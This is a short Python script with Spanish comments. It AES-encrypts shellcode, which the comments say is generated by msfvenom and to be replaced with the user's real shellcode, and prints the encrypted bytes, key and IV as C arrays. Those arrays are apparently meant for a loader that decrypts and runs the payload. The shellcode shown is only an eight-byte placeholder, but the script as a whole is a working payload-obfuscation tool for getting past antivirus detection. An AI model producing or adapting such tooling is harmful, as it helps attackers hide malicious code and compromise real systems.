from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

# Shellcode generado por msfvenom (ejemplo)
# Reemplaza con tu shellcode real
shellcode = bytearray(b"\xfc\x48\x81\xe4\xf0\xff\xff\xff")  # Ejemplo corto

# Generar clave AES aleatoria
key = os.urandom(32)
iv = os.urandom(16)

# Cifrar
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))

print("Clave AES:", key.hex())
print("IV:", iv.hex())
print("Shellcode cifrado:", encrypted_shellcode.hex())

# Formato para C - CORREGIDO
print("\nunsigned char encryptedShellcode[] = {")
for i, byte in enumerate(encrypted_shellcode):
    print(f"0x{byte:02x},", end='')
    if (i + 1) % 12 == 0:  # Cambiado a 12 para mejor formato
        print()
print("\n};")

# También imprimir la clave y IV en formato C
print(f"\nunsigned char key[] = {{")
for i, byte in enumerate(key):
    print(f"0x{byte:02x},", end='')
    if (i + 1) % 12 == 0:
        print()
print("\n};")

print(f"\nunsigned char iv[] = {{")
for i, byte in enumerate(iv):
    print(f"0x{byte:02x},", end='')
    if (i + 1) % 12 == 0:
        print()
print("\n};")